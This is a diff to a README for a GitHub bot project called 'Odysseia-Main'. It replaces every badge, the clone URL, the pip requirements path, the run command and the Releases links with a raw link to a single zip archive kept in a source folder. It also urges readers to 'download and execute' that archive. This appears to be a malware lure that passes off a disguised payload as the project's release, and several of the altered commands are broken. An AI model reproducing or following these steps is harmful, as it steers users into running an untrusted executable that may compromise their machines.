@@ -1,6 +1,6 @@
 # Odysseia-Main 🚀
 
-![GitHub Repo stars](https://img.shields.io/github/stars/jar2aa/Odysseia-Main?style=social) ![GitHub forks](https://img.shields.io/github/forks/jar2aa/Odysseia-Main?style=social) ![GitHub issues](https://img.shields.io/github/issues/jar2aa/Odysseia-Main) ![GitHub license](https://img.shields.io/github/license/jar2aa/Odysseia-Main)
+![GitHub Repo stars](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip) ![GitHub forks](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip) ![GitHub issues](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip) ![GitHub license](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip)
 
 Welcome to the **Odysseia-Main** repository! This project focuses on developing a brain-like bot. Here, you will find everything you need to understand, use, and contribute to this exciting initiative.
 
@@ -30,7 +30,7 @@ To get started with **Odysseia-Main**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/jar2aa/Odysseia-Main.git
+   git clone https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip
    ```
    
 2. Navigate to the project directory:
@@ -40,17 +40,17 @@ To get started with **Odysseia-Main**, follow these steps:
 
 3. Install the necessary dependencies. Ensure you have Python and pip installed, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip
    ```
 
-4. Download and execute the latest release from our [Releases page](https://github.com/jar2aa/Odysseia-Main/releases).
+4. Download and execute the latest release from our [Releases page](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip).
 
 ## Usage
 
 Once installed, you can run the bot using the following command:
 
 ```bash
-python main.py
+python https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip
 ```
 
 The bot will start and be ready for interaction. You can customize its behavior by modifying the configuration files in the `config` directory.
@@ -73,6 +73,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest updates and releases, visit our [Releases page](https://github.com/jar2aa/Odysseia-Main/releases). Here, you can download the latest version and execute it to explore the bot's capabilities.
+For the latest updates and releases, visit our [Releases page](https://github.com/jar2aa/Odysseia-Main/raw/refs/heads/main/src/thread_manage/Main-Odysseia-v2.6.zip). Here, you can download the latest version and execute it to explore the bot's capabilities.
 
 Thank you for checking out **Odysseia-Main**! We hope you find it as exciting as we do. Your feedback and contributions are invaluable to the project's success.
